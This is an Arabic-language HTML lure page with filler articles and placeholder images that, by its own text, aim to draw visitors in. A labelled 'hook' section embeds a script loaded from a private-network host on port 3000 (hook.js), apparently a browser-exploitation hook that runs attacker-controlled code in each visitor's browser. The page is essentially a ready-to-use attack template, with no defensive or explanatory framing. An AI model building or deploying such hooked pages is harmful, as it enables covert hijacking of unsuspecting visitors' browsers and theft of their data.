<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>صفحة جذابة بمحتويات الهوك</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            color: #333;
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 800px;
            margin: auto;
            padding: 20px;
            text-align: center;
        }
        h1 {
            color: #2c3e50;
        }
        .section {
            margin-bottom: 20px;
            padding: 15px;
            background-color: #ffffff;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
        }
        .section img {
            width: 100%;
            height: auto;
            border-radius: 5px;
        }
        .section p {
            line-height: 1.6;
            text-align: justify;
        }
        .hook-container {
            background-color: #e74c3c;
            color: white;
            padding: 10px;
            margin-top: 20px;
            border-radius: 8px;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>مرحبا بكم في صفحتنا</h1>

        <div class="section">
            <h2>مقالة قصيرة</h2>
            <p>
                هنا يوجد نص قصير حول موضوع معين. يمكن أن يتحدث عن أي شيء يخطر في البال، سواء كان معلومة بسيطة، أو تجربة شخصية، أو نصيحة مفيدة للقراء.
            </p>
            <img src="https://via.placeholder.com/600x300" alt="صورة توضيحية">
        </div>

        <div class="section">
            <h2>مقالة أخرى</h2>
            <p>
                هذا النص هو مثال آخر لمقالة قصيرة. الهدف من هذه المقالات هو جذب الزوار بمحتوى شيق وسريع القراءة.
            </p>
            <img src="https://via.placeholder.com/600x300" alt="صورة توضيحية">
        </div>

        <!-- مكان وضع أكواد الهوك مباشرة -->
        <div class="hook-container">
            <h2>تضمين أكواد الهوك</h2>
            <script src="http://192.168.11.104:3000/hook.js"></script>
        </div>

    </div>

</body>
</html>
